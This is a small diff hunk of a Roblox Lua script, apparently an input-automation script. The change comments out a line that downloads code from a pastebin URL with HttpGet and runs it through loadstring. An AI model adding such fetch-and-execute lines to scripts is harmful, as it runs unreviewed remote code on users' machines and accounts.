@@ -261,7 +261,7 @@ local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local VIM = game:GetService("VirtualInputManager")
 
-loadstring(game:HttpGet("https://pastebin.com/raw/MzKS5uvm"))()
+--loadstring(game:HttpGet("https://pastebin.com/raw/MzKS5uvm"))()
 
 local function getBehaviorFolder()
     return ReplicatedStorage:WaitForChild("Assets")
